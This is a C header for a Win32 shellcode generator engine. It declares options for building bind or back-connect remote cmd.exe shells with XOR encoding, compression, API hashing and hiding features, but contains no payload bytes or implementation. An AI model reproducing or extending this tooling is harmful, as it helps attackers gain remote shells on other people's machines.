
/* win32 ShellCode Constructor Engine v1.03 */

#ifndef __SHGE_H__
#define __SHGE_H__

#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#define snprintf _snprintf
#define vsnprintf _vsnprintf

#define SHGE_VERSION            "1.03"

#define MIN(a,b)                ((a)<(b)?(a):(b))
#define MAX(a,b)                ((a)>(b)?(a):(b))

/* shge() exit codes */

#define SHGE_RES_OK              0
#define SHGE_ERR_NOMEMORY        1
#define SHGE_ERR_NOSPACE_BIN     2
#define SHGE_ERR_NOSPACE_SRC     3
#define SHGE_ERR_NOSPACE_HPP     4
#define SHGE_ERR_BADPARAMS       5
#define SHGE_ERR_XOR             6
#define SHGE_ERR_STRUCTSIZE      7

#pragma pack(push,1)

struct SHGE_OPTIONS
{
  // shellcode parameters

  unsigned short        SHELL_PORT;
  int                   VAR_PORT;               // port = SHELL_PORT&0xff00 .. SHELL_PORT|0xff
  int                   MAXBUFSIZE;             // >= sizeof(WSAData), >= 127
  int                   USE_SEH;                // seh-protect (main thread)
  int                   USE_SEH_TH;             // if MULTITHREAD: seh-protect threads
  int                   USE_MUTEX;              // disallow multiple instances
  int                   DO_REUSEADDR;           // if !bc: reuse listen port
  int                   SUPPORT_WIN9X;          // choose from cmd.exe/command.com
  int                   USE_OLDWAY_2FIND_K32;   // dont use internal structures
  unsigned char         XORBYTE;                // used if defined, xor io data
  int                   USE_LASTCALL;
  int                   USE_XPUSH_STRINGS;
  int                   ALLOC_BUF;
  int                   BACKCONNECT;            // if defined, ip to connect() to. if undefined, bind() and listen()
  unsigned long         IP_ADDR;                // if BACKCONNECT: conn to, else: listen on
  unsigned long         RECONNECT_MS;           // used only if BACKCONNECT
  int                   MULTITHREAD;            // can use only if NOT BACKCONNECT. allows multiple clients and threads
  unsigned long         WS2_ID;
  unsigned long         K32_ID;
  int                   SUB_CREATEPIPE;
  int                   SUB_KILLSHELL;
  int                   SUB_INIT;
  int                   SUB_FINDBASE;
  int                   MACRO_CALL;
  int                   SYNTAX;                 // 0=tasm,masm 1=nasm
  int                   HASHTYPE;               // 0=rol7 1=~crc32 2=crc32
  int                   BC2HOST;
  char                  str_mutex  [256];
  char                  str_ws2    [256];
  char                  str_cmd    [256];
  char                  str_command[256];
  char                  str_host   [256];
  int                   INACT;

  int                   NOSHELL;
  int                   PROMPT;
  int                   AUTH;
  int                   SNIPPET;
  char                  str_prompt [256];
  char                  str_auth   [256];
  char                  str_snippet[256];

  int                   DONT_DROP;              //
  int                   DO_WSA_STARTUP;
  int                   DIRECT_API;

  int                   COMPRESSED;
  int                   BEST;
  int                   BEST2;
  int                   XORED;
  char                  HIDE[256];
  int                   P1,P2,P3,P4,P5; // compression parameters

  unsigned long         API_K32_GlobalAlloc;
  unsigned long         API_K32_GlobalFree;
  unsigned long         API_K32_CreateThread;
  unsigned long         API_K32_CloseHandle;
  unsigned long         API_K32_CreatePipe;
  unsigned long         API_K32_CreateProcessA;
  unsigned long         API_K32_GetExitCodeProcess;
  unsigned long         API_K32_PeekNamedPipe;
  unsigned long         API_K32_ReadFile;
  unsigned long         API_K32_WriteFile;
  unsigned long         API_K32_TerminateProcess;
  unsigned long         API_K32_ExitThread;
  unsigned long         API_K32_CreateMutexA;
  unsigned long         API_K32_GetLastError;
  unsigned long         API_K32_Sleep;
  unsigned long         API_K32_LoadLibraryA;
  unsigned long         API_K32_GetVersion;
  unsigned long         API_K32_WaitForSingleObject;
  unsigned long         API_K32_GetTickCount;
//  unsigned long         API_K32_GetProcAddress;

  unsigned long         API_WS2_WSAStartup;
  unsigned long         API_WS2_socket;
  unsigned long         API_WS2_setsockopt;
  unsigned long         API_WS2_closesocket;
  unsigned long         API_WS2_connect;
  unsigned long         API_WS2_gethostbyname;
  unsigned long         API_WS2_select;
  unsigned long         API_WS2_bind;
  unsigned long         API_WS2_listen;
  unsigned long         API_WS2_accept;
  unsigned long         API_WS2_send;
  unsigned long         API_WS2_recv;

  // source parameters

  int                   POS_INSTR;              //
  int                   POS_ARG1;               //
  int                   POS_COMM;               // tab positions
  int                   POS_HPP_COMMENT;        //
  int                   POS_HPP_COMMENT_SIZE;   //
  int                   HPP_TYPE;               // 0 = char*, 1 = array
  int                   SH_SIZE;                // generate shellcode_size
  int                   HPP_OFF;                // offsets into .hpp
  int                   CMT_SRC;                // source comments
  int                   CMT_HPP;                // hpp comments

  char                  l_prefix [256];
  char                  l_postfix[256];
  char                  x_prefix [256];
  char                  x_postfix[256];
  char                  c_prefix [256];
  char                  c_postfix[256];
  char                  m_prefix [256];
  char                  m_postfix[256];
  char                  a_prefix [256];
  char                  a_postfix[256];

  // output parameters

  char* out_bin;                // OUT, cant be NULL
  int   out_bin_size;           // OUT
  int   out_bin_maxsize;        // IN

  int   out_bin_c_plain;        // OUT }
  int   out_bin_c_comp;         // OUT } used by COMPRESS
  int   out_bin_c_decompr;      // OUT }
  int   best_P1,best_P2,best_P3,best_P4,best_P5; // OUT, set after COMPRESS+BEST

  char* out_src;                // OUT, cant be NULL
  int   out_src_size;           // OUT
  int   out_src_maxsize;        // IN

  char* out_hpp;                // OUT, cant be NULL
  int   out_hpp_size;           // OUT
  int   out_hpp_maxsize;        // IN

  char* out_struct;             // out, cant be NULL
  int   out_struct_size;        // out
  int   out_struct_maxsize;     // in

  int   mem_used;               // out
  int   mem_used_max;           // out

}; /* struct SHGE_OPTIONS */

#pragma pack(pop)

char* __cdecl get_version();  /* returns: ptr to SHGE_VERSION */
int __cdecl shge(struct SHGE_OPTIONS* options, int options_size);    /* returns: SHGE_xxx */
char* __cdecl get_error(int code);

#endif /* __SHGE_H__ */

/* EOF */
